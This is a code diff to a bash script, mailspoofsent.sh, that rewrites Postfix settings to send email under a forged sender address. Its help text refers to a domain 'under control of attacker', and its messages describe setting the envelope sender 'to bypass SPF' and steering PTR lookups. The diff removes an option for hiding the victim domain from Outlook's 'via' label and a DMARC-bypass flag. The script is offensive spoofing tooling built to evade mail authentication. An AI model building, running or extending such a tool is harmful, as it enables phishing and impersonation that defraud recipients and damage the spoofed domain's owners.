@@ -45,7 +45,7 @@ while [[ $# -gt 0 ]]; do
   key="$1"
   case $key in
     -h|--help)
-      echo "Usage: ./mailspoofsent.sh [--bcc bcc_address] --mail-from mail_from --mail-to mail_to --mail-envelope mail_envelope --subject subject --body body [--spoof-domain domain] --dmarcbypass bypassdomain"
+      echo "Usage: ./mailspoofsent.sh [--bcc bcc_address] --mail-from mail_from --mail-to mail_to --mail-envelope mail_envelope --subject subject --body body [--spoof-domain domain]"
       echo ""
       echo "Options:"
       echo "  --bcc bcc_address   Specify a bcc address for the email"
@@ -55,7 +55,6 @@ while [[ $# -gt 0 ]]; do
       echo "  --subject           The subject of the email"
       echo "  --body              The body of the email"
       echo "  --spoof-domain      The domain to spoof from under control of attacker"
-      echo "  --viahost       The domain of the victim to remove via feature of outlook"
       exit
       ;;
     --bcc)
@@ -93,11 +92,6 @@ while [[ $# -gt 0 ]]; do
       shift
       shift
       ;;
-    --viahost)
-      viahost="$2"
-      shift
-      shift
-      ;;
     *)
       shift
       ;;
@@ -116,8 +110,8 @@ MAIL_FROM_DOMAIN=$(echo $mail_from | awk -F@ '{print $2}')
 SPOOF_DOMAIN=$(echo $spoof_domain | awk -F@ '{print $2}')
 echo "[+] Updating hostname to $spoof_domain so PTR record lookup is for domain under control..."
 sudo sed -i "s/^myhostname =.*/myhostname = $spoof_domain/" /etc/postfix/main.cf
-sudo sed -i "s/^mydestination =.*/mydestination = $myhostname, localhost.localdomain, , localhost/" /etc/postfix/main.cf
-echo "$viahost" | sudo tee /etc/mailname > /dev/null
+echo "[+] Updating Postfix configuration..."
+sed -i "s/^mydestination =.*/mydestination = $myhostname, localhost.localdomain, , localhost/" /etc/postfix/main.cf
 sudo systemctl restart postfix
 
 # add List-Unsubscribe header
@@ -150,7 +144,7 @@ fi
 echo "[+] Setting smtp.mailfrom address to mail_envelope value to bypass SPF..."
 sudo sed -i "s/^smtp.mailfrom =.*/smtp.mailfrom = $mail_envelope/" /etc/postfix/main.cf
 sudo sed -i "s/^header.from =.*/header.from = $mail_from/" /etc/postfix/main.cf
-echo "[+] Applying changes to postfix configuration..."
+echo "[+] Appling changes to postfix configuration..."
 sudo service postfix restart
 
 # Cleaning up
